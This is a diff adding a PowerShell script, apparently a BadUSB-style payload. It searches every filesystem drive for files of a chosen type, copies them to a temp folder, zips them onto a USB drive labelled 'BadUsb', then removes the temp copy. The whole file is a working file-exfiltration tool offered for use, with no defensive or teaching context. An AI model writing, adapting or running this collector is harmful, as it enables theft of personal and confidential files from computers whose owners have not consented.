@@ -1,0 +1,42 @@
+
+$targetExtension = "*.txt"              # Change to any file type (e.g., *.jpg, *.docx)
+$usbLabel = "BadUsb"                # Your USB drive label (set this via File Explorer)
+$outputZip = "CollectedFiles.zip"
+
+# === GET USB DRIVE PATH ===
+$usbDrive = (Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq $usbLabel }).Name
+if (-not $usbDrive) {
+    Write-Host "USB drive not found. Please check the label."
+    exit
+}
+
+# === TEMP STORAGE ===
+$tempFolder = "$env:TEMP\FileDump"
+if (Test-Path $tempFolder) {
+    Remove-Item -Recurse -Force $tempFolder
+}
+New-Item -ItemType Directory -Path $tempFolder | Out-Null
+
+# === SEARCH AND COLLECT FILES ===
+Get-PSDrive -PSProvider FileSystem | ForEach-Object {
+    $drive = $_.Root
+    try {
+        Get-ChildItem -Path $drive -Recurse -Filter $targetExtension -ErrorAction SilentlyContinue |
+        ForEach-Object {
+            Copy-Item $_.FullName -Destination $tempFolder -Force
+        }
+    } catch {
+        Write-Warning "Error accessing drive $drive"
+    }
+}
+
+# === COMPRESS TO USB ===
+$outputZipPath = Join-Path -Path $usbDrive -ChildPath $outputZip
+if (Test-Path $outputZipPath) { Remove-Item $outputZipPath -Force }
+Compress-Archive -Path "$tempFolder\*" -DestinationPath $outputZipPath
+
+# === CLEANUP ===
+Remove-Item -Recurse -Force $tempFolder
+
+# === DONE ===
+[System.Windows.Forms.MessageBox]::Show("File collection complete. Saved to $outputZipPath.", "Complete")
